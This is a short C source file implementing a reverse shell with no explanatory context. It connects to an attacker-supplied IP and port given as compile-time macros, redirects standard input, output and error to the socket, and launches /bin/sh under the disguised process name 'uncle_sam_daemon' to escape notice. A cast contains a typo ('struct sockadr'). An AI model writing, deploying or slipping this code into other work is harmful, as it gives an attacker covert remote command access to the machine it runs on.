#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>


int main () {

	const char* ip = REVERSE_SHELL_IP;
	struct sockaddr_in addr;


	addr.sin_family = AF_INET;
	addr.sin_port = htons(REVERSE_SHELL_PORT);
	inet_aton(ip, &addr.sin_addr);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

	for (int i = 0; i < 3;i++) {

		dup2(sockfd, i);
	}
	char* argv1 = "uncle_sam_daemon";
	char* argv[] = {argv1, NULL};
	execve("/bin/sh", argv, NULL);

	return 0;

}
